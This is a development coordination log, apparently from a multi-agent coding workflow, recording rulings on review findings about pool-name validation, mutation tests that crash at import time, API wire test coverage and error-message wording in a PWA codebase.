
### D-2609 — `accountPool` accepts off-grammar pool strings

`parseRoster` THROWS on any pool failing `POOL_NAME_RE` (`shared/roster.ts:535`), so the canonical wire
cannot carry `''`; the exposure is a malformed payload or a stale same-origin cache. **In scope,
narrowly**, and the composable option composes: `POOL_NAME_RE` is exported at `shared/roster.ts:285`,
`shared/` is L0 and the PWA already bundles it (`pwa/src/lib/offline.ts` imports `HUES` from there). So
`typeof p === 'string' && POOL_NAME_RE.test(p) ? p : null` — the SAME constant, so `pool-name-parity`
keeps covering it and `single-definition` finds nothing new.

**Out of scope, confirmed so it is settled:** do not broaden server-side or offline-cache validation.
**And the permissive direction is already argued** — folding off-grammar to `null` means untagged, which
`shared/poolrule.ts`'s own docstring justifies for the account-this-side-cannot-see case. Told the worker
to cite it rather than invent a fresh justification.

**D-2608/2609/2610 issued** (floor 2611), mail 768, question 767 acked.

**Six findings, six times the plan was the defective party.** Posture unchanged.

---

## 2026-09-12 12:11Z — D-2615: a mutant that crashes before the assertions run

Mail 789. Task 3 is implemented and green (67/67, clean tsc) but stopped before commit. Confirmed and
**reproduced** at `origin/main`.

**The mechanism.** `pwa/src/stores/fleet.ts:436` is `export const useFleetStore = createFleetStore();` —
MODULE SCOPE, so it runs at import. Line 215's `loadFleetSnapshot()` returns `FleetSnapshot | null` with
**eight** `return null` paths, and a fresh jsdom has no snapshot. The prescribed mutant writes
`(snapshot as unknown as { pools?: ProjectPoolsWire }).pools ?? null` — a **bare dot**. Measured: it
throws `Cannot read properties of null (reading 'pools')`; the chained form returns `null`.

**The tell was sitting next to it.** The two neighbouring lines read `snapshot?.sessions ?? []` and
`snapshot?.roster ?? []` — optional chaining, both. The mutant breaks the idiom its own neighbours follow.

### Why it is a deviation and not a typo — the part written into the entry

**A mutant must change exactly ONE thing.** This changes the persistence widening (under test) *and*
removes null-safety (not under test); the second fires first and masks the first entirely.

**And an import-time crash is a FALSE red, not a weak one.** A mutation table exists to prove a guard is
pinned BY AN ASSERTION. A mutant dying during module evaluation reds the suite for a reason unrelated to
the guard — vitest reports a failed file with **zero registered tests**. Had the plan written "expected
red: TypeError", a future executor would have ticked the box having never exercised the persistence
assertion once. **It is the mirror image of a mutation that stays green: both prove nothing, and the
crash is the more dangerous because it looks like success.**

**Ruled:** the smaller null-safe form, which needs no new import and matches the siblings exactly —
`(snapshot as unknown as { pools?: ProjectPoolsWire } | null)?.pools ?? null`. Typechecked all three
candidate forms (plan's, the worker's, mine); all three compile, but the worker's needs `FleetSnapshot`
in scope, a wider edit than a mutation should require. Then confirm the NAMED red and record the ACTUAL
failing assertion text, not the plan's predicted string.

**Added to the standing posture:** before running any remaining mutation, ask (1) does it change exactly
one thing, and (2) does the suite reach the assertion. Those two questions would have caught D-2597,
D-2608 and D-2615 between them. Saved as [[an-import-time-crash-is-a-false-red]].

**D-2615 issued** (floor 2616), mail 790, question 789 acked.

**Seven findings, seven times the plan was the defective party** — and three of the seven are the plan
predicting its own mutation reds wrongly (inert / backwards / crashes first).

---

## 2026-09-12 13:01Z — Task 2 review: 2 of 3 upheld, 1 REFUTED, and two NEW findings underneath

Mail 796. Three independent verifiers (opus) run over the worker's three findings, cruxes re-measured by
me. **This is the first round where the worker's own review was wrong** — and refuting it found a bigger
gap. D-2617..D-2620 issued (floor 2621); they do NOT map one-to-one onto the three entries.

### Finding 1 — REFUTED as a finding. The remedy would have made it worse.

The mechanical half is right: four absent/false call sites, all `JSON.parse` + `toEqual`, blind to
whitespace and key order. The consequential half is not.

**Byte identity is not the property that matters**, measured: `post` is a bare `JSON.stringify` with no
replacer or space argument; the server consumes only the PARSED object; there is no `rawBody`, no
`addContentTypeParser`, no Fastify schema, no body-keyed dedupe, no idempotency key, no request-body
signature. Every consumer is a JSON parser — an older server cannot observe whitespace or key order.
And the defect the prose names ("an older server reading an unexpected KEY") is exactly what `toEqual`
fails on, already mutation-proven at plan :744.

**`.toBe` would be actively wrong for `createSession`.** It becomes `({crossPool, ...rest}) => post(…, rest)`
— `rest` is a REST-SPREAD, so key order is the CALLER's insertion order, which the api client does not
own (`NewSessionSheet.tsx:154`, `StartProgramSheet.tsx:654`). A `.toBe` pins the TEST's literal order, so
reordering either call site — a harmless refactor — changes production bytes with the test still GREEN.
**False confidence is worse than an honest structural pin.**

- **D-2617** — what IS wrong is the PROSE: "byte-identical" at :536, :545-549, :586, :697-698, :723-725
  means "the same keys and values". This wave's own recurring class, a claim the assertion does not
  support. Reword the prose; **do not weaken the assertions.**
- **D-2618 (NEW, found while refuting)** — **`swap` has NO wire pin anywhere in the PWA suite.**
  `pwa/test/api.test.ts` on main contains zero occurrences of "swap"; Task 2's tests are its first, and
  they discard the URL and never assert `method` or `content-type`. A typo in `${sid(id)}/swap` or a
  `post`→`postJson` slip is caught by **nothing in this repo**. Fixed by finishing the precedent the plan
  itself cites at :548-549 and does not follow (`archive`'s shape) — and legitimate there, because
  `swap`'s object literal lives in `api.ts` where the client owns it.

### Finding 2 — UPHELD (D-2619), with the decisive argument the worker did not have

`refusePool`'s 503 arm sends `{error:'pool-unreadable', state: v.state}` — one code, two states, `state`
on the wire, ignored by `apiErrorText`. Two corrections, both strengthening:

- **NOT a server defect.** Collapsing the DECISION is *mandated* — `ccd/ccd:1456-1458` voids its own
  safety park if any decider splits the two states. The server deliberately preserved `state` so the
  MESSAGE can differ. The defect is entirely PWA-side.
- **This same plan already forbids this fold elsewhere.** §11 row 24 (:1089) pins DISTINCT aria-labels
  for malformed vs unreadable on `PoolChip`; :1285-1287 argues why; :1547 makes merging them a required
  RED; `PoolSheet` writes two sentences. **As prescribed, the chip reads "pool malformed" while a toast
  from tapping that same project says "could not be read" — two ccrc surfaces contradicting each other
  on one measured fact, on the same screen.** Internal inconsistency, not a judgement call.

Fix follows the idiom `apiErrorText` already establishes: `stderr` is read from the body and
short-circuits the static map, so a `state`-aware branch is not a new pattern.

### Finding 3 — UPHELD (D-2620), and worse than reported

Reachability confirmed end to end: `StartProgramSheet` → `api.createSession` → `POST /api/sessions` →
`refusePool` (`server.ts:1990`) → 409. Its `createSession` prop is `{wrapper; project; workdir?}` — no
pool parameter — and it renders `apiErrorText(err)` directly.

**The worker's mechanism wording would have refuted itself.** "via global UNTAGGED projection" reads as
though the ACCOUNT were untagged — and an untagged account is the one case that can NEVER mismatch
(`poolrule.ts:44`, verbatim). The real mechanism: `/api/accounts`'s `projected` is computed with the POOL
ARGUMENT `{state:'untagged'}` (`server.ts:1226`, its comment says "THE UNTAGGED FORECAST"), so the
account it names may itself be pool-TAGGED and collide. Same conclusion, different reason.

**It promises TWO absent controls, not one** — "pick an account the project's pool admits" is also false:
the sheet has no account picker at all.

**Scope ruled, three measured reasons:** the SPEC's own surfaces table omits StartProgramSheet (the gap
is upstream, and the plan is faithful); adding the control means inventing an account chooser — a product
decision, not one to take mid-wave; and `StartProgramSheet.tsx:258` pins the sheet at exactly two network
calls. Make the sentence truthful; **do not touch the sheet.**

### Reported, not taken

`shared/poolrule.ts:29-31` says the verdict "CARRIES BOTH NAMES so a 409 body … can say which two pools
disagreed", and the route ships them — but `API_ERROR_TEXT` is a static Record and `apiErrorText`
discards the body, so **no flow ever tells the operator which two pools collided, on a wire built to tell
them.** Same root cause as D-2619. Deliberately NOT folded in and NOT an expansion of the worker's scope:
recorded as a `D-TBD` token pending a decision on where it lands.

**Eight findings now. Seven upheld, one refuted — and refuting it produced D-2618, the largest coverage
hole found this wave.** Worth recording: the review apparatus is good enough that its misses are
productive, but "the worker's review said so" is not itself evidence.

---

## 2026-09-12 13:29Z — D-2621: TAKEN, not deferred. I reversed my own lean, and why.

Mail 806. Task 2 fix committed `7febd162` (D-2617..D-2620, focused API 64/64, tsc clean, re-review
running); Task 3 committed `3813f51d`, also under review. The worker asked for a number and a scope
ruling on the item I had recorded as REPORTED, NOT TAKEN.

**I expected to defer. Measuring the fix reversed it.**

Two things looked true when I wrote "not taken": that the fix required changing `API_ERROR_TEXT` from
`Record<string,string>` into something that can interpolate — a design step, not a copy fix — and that
the user-visible gap was confined to `StartProgramSheet`, because `SwapSheet` and `NewSessionSheet`
compute `splitByPool`/`poolSide` LOCALLY from the roster and the pools frame and so already show which
pools are in play without reading the 409 body.

**The second is true and stays true. The first is false.** `apiErrorText` already reads `stderr` from
the body and short-circuits the map, and D-2619 is adding a second pre-map branch for `state` in that
same function right now. A third branch for `pool-mismatch` is the same idiom again; the static entry
stays as written and becomes the FALLBACK for a body carrying no names — absence-permits, which is this
repo's wire discipline rather than a special case. One branch, one constant, two tests.

**And deferral had a cost I had not priced: D-2620 is rewriting that exact sentence NOW.** Defer, and
the same string is rewritten twice, its tests invalidated twice, its copy reviewed twice — and in between
we ship a sentence that is merely *not false* where it could have been *useful*. This is the one moment
where it is free.

**It also settles what D-2620 alone leaves unsatisfying.** Making the sentence truthful without promising
a control is right, but it leaves `StartProgramSheet` — the one surface with no pool UI, where the toast
is the only channel — saying nothing except that a pool refused. Naming the two pools promises no control;
it is the fact the operator needs in order to act elsewhere. It turns a dead end into a lead.

And the wire was built for it: `shared/poolrule.ts:29-31` says the verdict *"CARRIES BOTH NAMES so a 409
body, a die message and a chip can each say which two pools disagreed"*. A wave whose whole job is the
PWA pool surface should not be the one that ignores the field designed for it.

**Required of the fix:** same commit as D-2620 (one sentence, do not split it); branch on the code AND
both names being strings, falling through to the static entry when either is absent — an older server
does not carry them, and absence must permit rather than print `undefined`; tests BOTH ways, the
without-names case being the one such fixes usually forget; and the mutation checked against the two
standing questions from D-2615 (exactly one thing changed, suite reaches the assertion).

**D-2621 issued** (floor 2622), mail 808, status 806 acked.

**Nine findings. The coordinator has now been wrong twice** — the stale-tree ruling, and this lean toward
deferral — and both times the correction came from measuring rather than from being challenged. Worth
keeping: a scope ruling is a claim about COST, and cost is measurable; I had guessed at it.
